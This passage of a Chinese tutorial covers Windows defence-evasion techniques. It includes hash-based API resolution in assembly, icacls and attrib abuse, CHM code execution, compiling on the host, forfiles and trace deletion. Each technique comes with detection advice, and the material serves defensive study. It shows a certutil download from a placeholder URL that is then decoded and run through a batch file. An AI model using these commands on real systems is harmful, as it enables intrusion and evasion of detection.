        test        al, al;                 // 0则退出
        jz          tag_end;
        mov         ebx, [ebp - 0x04];
        shl         ebx, 0x19;
        mov         edx, [ebp - 0x04];
        shr         edx, 0x07;
        or ebx, edx;
        add         ebx, eax;
        mov[ebp - 0x4], ebx;
        inc         ecx;
        jmp         tag_loop;
    tag_end :
        mov         ebx, [ebp + 0x0C];      // 获取HASH
        mov         edx, [ebp - 0x04];
        xor         eax, eax;
        cmp         ebx, edx;
        jne         tag_failuer;
        mov         eax, 1;
        jmp         tag_funend;
    tag_failuer:
        mov         eax, 0;
    tag_funend:
        pop         esi;
        pop         edx;
        pop         ecx;
        pop         ebx;
        mov         esp, ebp;
        pop         ebp;
        ret         0x08
    start:
        pushad;
        push        Hash;                       // Hash加密的函数名称
        push        dllvalues;                  // 模块基址.dll
        call        GetHashFunVA;               // GetProcess
        mov         FunctionAddress, eax;       // ☆ 保存地址
        popad;
    }
    return FunctionAddress;
    }
#### 运行效果图
当主程序执行时，记事本就会运行，并通过进程树发现，记事本作为explorer.exe的子进程在运行。
#### 检查及限制方案
监视操作EWM(如GetWindowLong和SetWindowLong)相关的API调用。
#### 参考链接
### 15、修改文件权限
#### 原理及代码介绍
文件和目录权限通常由文件或目录所有者指定的自主访问控制列表(DACL)管理。自主访问控制列表(DACL)是一个最普遍类型的访问控制列表(ACL)。在一个DACL(Discretionary
Access Control
List)中,指出了允许和拒绝某用户或用户组的存取控制列表。当一个进程需要访问安全对象时，系统就会检查DACL来决定进程的访问权。如果一个对象没有DACL,则说明任何人对这个对象都可以拥有完全的访问权限。
用户可以使用attrib.exe二进制文件修改特定文件的属性。简单地命令`attrib +h filename`，就是隐藏文件。
攻击者可以通过修改文件或目录的权限和属性以攻破DACL的设置。著名的WannaCry 就使用了`attrib +h`和`icacls . /grant
Everyone:F /T /C /Q` 隐藏其某些文件并授予所有用户完全访问控制权限
对ICacls详细参数可参考：
对attrib详细参数可参考：
从这些功能上看，通过修改文件属性和权限，可以针对绕过文件监视，文件系统访问控制。
#### 运行效果图
ICacls查看目录和文件的权限
隐藏文件
#### 检查及限制方案
  1. 监视和调查修改DACL和文件/目录所有权的操作，例如icacls的使用。
  2. 考虑对二进制或配置文件的目录权限更改进行审核。
  3. 修改DACL时使用Windows安全日志记录事件。
#### 参考链接
  1. 
  2. 
  3. 
### 16、CHM文件隐藏代码执行
#### 原理及代码介绍
CHM文件是一种“已编译的HTML文件”，是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。而该类型的文件是可以用Windows自带的hh.exe文件来打开的。CHM文件可以包含各种文件，如HTML文件，图像以及与脚本相关的编程语言。攻击者可能会滥用此技术来隐藏恶意代码，传输包含代码的自定义CHM文件。并且可以绕过一些未升级的系统上的应用程序白名单。Silence组织就曾使用恶意CHM文档攻击俄罗斯银行。
编写CHM文件需要准备一个HTML文件，如下：
      title
了解HTML文件格式可以访问：[HTML文件格式](https://baike.baidu.com/item/HTML文件/7176861?fr=aladdin)
众所周知，HTML文件不能执行cmd命令，编译成CHM文件就可以完美执行。
CHM文件的制作工具比较多，本次介绍一款工具 easy
chm，可以去[官网](http://www.etextwizard.com/easychm.html)下载。
     打开easy chm后点击新建
将HTML文件单独放在一个文件夹中，浏览的路径是一个文件夹路径
确定之后，点击编译即可
#### 运行效果图
双击运行生成的CHM文件，弹出计算器
#### 检查及限制方案
  1. 监视和分析hh.exe的执行和参数。将最近对hh.exe的调用与已知的参数的历史进行比较，以确定异常和潜在的对抗性活动。
  2. 监视CHM文件的存在和使用。
#### 参考链接
  1. 
  2. 
  3. 
### 17、本机程序编译代码执行
#### 原理及代码介绍
当进行数据的传输时，Windows可能会对可执行文件进行分析和检查。如果将文件作为未编译代码传递，这些代码的行为就会难以被发现和分析。当然这些代码需要编译后执行，通常是通过本机的实用工具（如csc.exe）进行编译。
csc.exe是微软.NET Framework
中的C#语言编译器，在环境变量里加入csc.exe的路径：C:\Windows\Microsoft.NET\Framework\v4.0.30319（注意,路径和版本号会因为你的安装和下载的不同而不同,自己到安装目录下看看）。
用记事本编写源代码：
    using System;
    using System.Windows.Forms;
    class TestApp
    {
      public static void Main()
      {
      MessageBox.Show("Hello!");
      }
    }
保存为.cs文件，在cmd命令行中执行命令：csc /reference:System.Windows.Forms.dll TestApp.cs
即可编译成TestApp.exe。
关于csc.exe详细命令参数可参考：[csc.exe命令](https://baike.baidu.com/item/csc.exe/9323691?fr=aladdin)
MinGW(Minimalist GNU For
Windows)是个精简的Windows平台C/C++、ADA及Fortran编译器。[下载地址](http://www.mingw.org/)。
安装完成之后，配置环境变量，可以编译.c文件。
命令：gcc test.c -o test
这种技术可以绕过基于签名的检测，白名单等。
#### 运行效果图
cse.exe
编译完成并生成exe文件。
MinGW:
命令行编译完成，生成exe文件
#### 检查及限制方案
  1. 监视常用编译器(如csc.exe)的执行文件路径和命令行参数，并与其他可疑行为相关联。 
  2. 寻找非本地二进制格式和跨平台编译器和执行框架，如Mono，并确定它们在系统上是否有合法的用途。
#### 参考链接
  1. 
  2. 
  3. 
### 18、间接命令执行
#### 原理及代码介绍
在Windows系统中可以使用各种Windows实用程序来执行命令，而不需要调用CMD。攻击者可能会滥用这些特征来绕过一些防御机制，如应用程序白名单等。
使用 Forfiles 可以通过不直接调用CMD，来隐藏命令执行。
Forfiles是一款windows平台的软件工具，其中选择文件并运行一个命令来操作文件。文件选择标准包括名称和上次修改日期。命令说明符支持一些特殊的语法选项。它可以直接在命令行中使用，也可以在批处理文件或其他脚本中使用。forfiles命令最初作为加载项提供在Windows
NT 资源工具包中。它成为Windows Vista的标准实用程序，作为新管理功能的一部分。
具体Forfiles使用参数参考：
#### 运行效果图
运行Forfiles
#### 检查及限制方案
监视和分析来自基于主机的检测机制(如Sysmon)的日志，查看包含或由调用程序，命令，文件，生成子进程，网络连接相关的参数的进程创建等事件。
#### 参考链接
  1. 
  2. 
### 19、解码文件并执行
#### 原理及代码介绍
攻击者可以混淆文件或信息，从而无法分析恶意代码的行为和信息。混淆的方法有很多，比如最简单的异或和其它的加密算法。下面介绍一种恶意软件使用过的方法。
Windows有一个名为CertUtil的内置程序，可用于在Windows中管理证书，使用此程序可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。
攻击者可以利用certutil.exe把二进制文件（包括各种文件）经过base64编码为文本，这样可以将可执行文件隐藏在文件中，使恶意代码样本看起来像是无害的文本文件。
先将程序编码为文本：
    certutil -encode hello.exe hello.txt
下载文件到本地
    certutil -urlcache -split -f [URL] hello.txt
将文本解码为程序
    certutil -decode hello.txt hello.exe
也可以将程序编码为批处理文件（bat），在文件头部添加几行批处理代码
    @echo off`
    `certutil -decode "%~f0" hello.exe`
    `start hello.exe`
    `exit /b 1
像这种编码混淆文件的方法可以绕过基于签名的检测，网络入侵检测等，较多的恶意代码样本使用了此技术。
#### 运行效果图
执行完encode后生成的txt文件和bat文件内容
执行decode解码为exe文件，或直接执行bat脚本文件，代码顺利执行
#### 检查及限制方案
执行进程和命令行监视，以检测与脚本和系统实用程序相关的潜在恶意行为。
#### 参考链接
### 20、入侵痕迹清除
#### 原理及代码介绍
在分析恶意代码的时候，大家通常都会看到很多删除文件的操作。通过删除文件，攻击者可以清除入侵过程中的痕迹，防止留下证据被防御者找到。删除文件的方法有很多，大多数是用一些库函数，API,system命令等等。具体代码如下：
    int main()
    { 
     string dirName = "D:\\test";  
     bool  flag = RemoveDirectory(dirName.c_str());` 
     return 0; 
    } 
    int main()
    {
        string path = "c:\\test.chm";
        rmdir(path.c_str());
        return 0;
    }
    int main()
    {
        string command;
        command = "rd /s /q c:\\test ";
        system(command.c_str());
    }
    int main()
    {